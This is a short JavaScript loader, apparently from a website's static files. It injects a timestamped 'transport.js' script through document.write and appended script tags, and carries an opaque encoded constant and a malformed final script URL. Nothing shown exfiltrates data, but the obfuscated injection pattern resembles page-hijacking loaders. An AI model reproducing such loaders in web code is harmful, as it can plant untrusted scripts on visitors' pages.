var _b, _c, _ju = "../statics/js/transport.js";
_ju = _ju + (_ju.indexOf("?") > 0 ? "&" :"?") + "_t=" + new Date().getTime(),
_b = "AH488569",_c = "379509707_(iKg6V1m0V1gtV1gtih==_358296146_@iJvkDKetD1vdDK9h9JgWitfZMe==_)iKghiJeh", function(a) {
    function b(b) {
        var c = a.createElement("script");
        c.setAttribute("src", b), a.head ? a.head.appendChild(c) :a.body && a.body.appendChild(c);
    }
    var c = a.location.host.split("."), d = c.length, e = c[d - 2] + "." + c[d - 1];
    /^(com|net|org|gov)$/.test(c[d - 2]) && d > 2 && (e = c[d - 3] + "." + c[d - 2] + "." + c[d - 1]),
        _ju.indexOf(e) > 0 ? (a.write('<div><script>document.write(unescape(\'%3Cscript id="_ju_" src="' + _ju + "\" %3E%3C/script%3E') );</script></div>"),
        a.getElementById("_ju_") || b(_ju)) :b(_ju), b("="+_b+"&");
}(document);
